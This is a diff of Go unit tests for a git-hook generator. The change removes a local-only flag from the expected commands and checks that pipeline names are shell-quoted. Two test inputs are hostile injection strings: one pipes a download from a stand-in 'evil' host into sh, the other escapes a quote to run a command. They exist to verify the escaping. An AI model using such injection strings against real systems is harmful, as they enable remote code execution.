@@ -6,7 +6,7 @@ import (
 	"testing"
 )
 
-func TestRenderHookScript_DefaultsManagedRunsToLocalOnly(t *testing.T) {
+func TestRenderHookScript_ScrubsTheAmbientProfile(t *testing.T) {
 	script := renderHookScript("pre-commit", []string{"gate"}, false)
 	if !strings.Contains(script, "unset SPARKWING_PROFILE") {
 		t.Errorf("hook should scrub the ambient profile:\n%s", script)
@@ -14,8 +14,8 @@ func TestRenderHookScript_DefaultsManagedRunsToLocalOnly(t *testing.T) {
 	if !strings.Contains(script, "SPARKWING_SECRETS_PROFILE") {
 		t.Errorf("hook should scrub the independent secrets profile:\n%s", script)
 	}
-	if !strings.Contains(script, "sparkwing run 'gate' --sw-local-only") {
-		t.Errorf("an unpinned hook should stay local:\n%s", script)
+	if !strings.Contains(script, "sparkwing run 'gate'\n") {
+		t.Errorf("an unpinned hook should run the pipeline plainly:\n%s", script)
 	}
 	if strings.Contains(script, "--profile") {
 		t.Errorf("no --profile was pinned, so none should be passed:\n%s", script)
@@ -25,7 +25,7 @@ func TestRenderHookScript_DefaultsManagedRunsToLocalOnly(t *testing.T) {
 func TestRenderHookScript_QuotesPipelineName(t *testing.T) {
 	hostile := `gate; curl https://evil/x | sh #`
 	script := renderHookScript("pre-commit", []string{hostile}, false)
-	want := "sparkwing run 'gate; curl https://evil/x | sh #' --sw-local-only\n"
+	want := "sparkwing run 'gate; curl https://evil/x | sh #'\n"
 	if !strings.Contains(script, want) {
 		t.Errorf("pipeline name should be one single-quoted argument:\n%s", script)
 	}
@@ -33,7 +33,7 @@ func TestRenderHookScript_QuotesPipelineName(t *testing.T) {
 
 func TestRenderHookScript_EscapesQuoteInPipelineName(t *testing.T) {
 	script := renderHookScript("pre-commit", []string{`a'; touch /tmp/pwned #`}, false)
-	want := `sparkwing run 'a'\''; touch /tmp/pwned #' --sw-local-only` + "\n"
+	want := `sparkwing run 'a'\''; touch /tmp/pwned #'` + "\n"
 	if !strings.Contains(script, want) {
 		t.Errorf("an embedded quote should be escaped, not closed:\n%s", script)
 	}
@@ -76,12 +76,12 @@ func TestDescribeManagedHook_ReadsLegacyNamesHoldingAQuoteOrBackslash(t *testing
 
 func TestRenderHookScript_ForwarderCarriesNoProfile(t *testing.T) {
 	script := renderHookScript("prepare-commit-msg", nil, true)
-	if strings.Contains(script, "--profile") || strings.Contains(script, "--sw-local-only") {
+	if strings.Contains(script, "--profile") || strings.Contains(script, "sparkwing run") {
 		t.Errorf("a forwarder should carry no run flags:\n%s", script)
 	}
 }
 
-func TestRunPipelineForProof_RunsLocalOnly(t *testing.T) {
+func TestRunPipelineForProof_RunsThePipelinePlainly(t *testing.T) {
 	t.Setenv("PATH", t.TempDir())
 	t.Setenv("SPARKWING_PROFILE", "ambient-profile")
 	t.Setenv("SPARKWING_SECRETS_PROFILE", "ambient-secrets")
@@ -97,8 +97,8 @@ func TestRunPipelineForProof_RunsLocalOnly(t *testing.T) {
 	if cmd.Path != self || cmd.Err != nil {
 		t.Errorf("proof executable = %q (%v), want %q", cmd.Path, cmd.Err, self)
 	}
-	if got := strings.Join(cmd.Args[1:], " "); got != "run gate --sw-local-only" {
-		t.Errorf("proof args = %q, want run gate --sw-local-only", got)
+	if got := strings.Join(cmd.Args[1:], " "); got != "run gate" {
+		t.Errorf("proof args = %q, want run gate", got)
 	}
 	if cmd.Dir != repo {
 		t.Errorf("proof directory = %q, want %q", cmd.Dir, repo)
